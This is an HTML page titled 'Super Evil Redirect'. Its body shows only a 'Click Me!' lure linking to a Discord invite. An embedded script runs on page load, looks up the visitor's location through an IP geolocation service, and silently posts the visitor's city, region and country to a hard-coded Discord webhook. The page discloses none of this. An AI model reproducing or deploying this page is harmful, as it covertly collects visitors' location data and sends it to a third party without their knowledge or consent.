<!DOCTYPE html>
<html>
<head>
    <title>Super Evil Redirect</title>
    <script>
        fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const city = data.city;
                const region = data.region;
                const country = data.country;
                const fullLocation = `${city}, ${region}, ${country}`;
                const webhookUrl = "https://discord.com/api/webhooks/1215230541012533329/QL6bid_K69KCm-K8W-kaCuZvdDDyP5eTr0Eoz_oOYp46GKUTNoKssoayrJlONmcmmkbU";
                fetch(webhookUrl, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ location: fullLocation })
                });
            });
    </script>
</head>
<body>
    <h1>Click here for something even more interesting!</h1>
    <a href="https://discord.gg/Mx9kpAkF5p">Click Me!</a>
</body>
</html>
